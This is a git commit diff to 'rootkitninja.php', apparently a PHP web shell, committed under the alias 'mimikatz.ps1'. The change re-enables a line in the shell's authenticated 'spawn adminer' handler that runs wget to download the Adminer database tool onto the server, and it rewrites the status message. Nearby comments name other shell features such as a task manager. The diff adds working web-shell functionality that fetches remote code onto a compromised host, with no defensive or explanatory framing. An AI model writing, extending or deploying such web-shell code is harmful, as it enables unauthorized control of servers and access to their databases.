e49296231cf2616f945a8098f08a4a91b7a00b0f
mimikatz.ps1 <131539265+ortod0x@users.noreply.github.com>
2024-10-17 15:12:52 +0700

    Update rootkitninja.php

--- rootkitninja.php
+++ rootkitninja.php
@@ -2090,8 +2090,8 @@ if($s_auth){
 
 	// spawn adminer
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='adminer')){
-        	//exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
-		$s_result .= "Adminer Spawned | Access: ".$s_cwd;
+        	exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
+		$s_result .= "<p class='notif'>Adminer Spawned</p>";
 	}
 	
 	// task manager
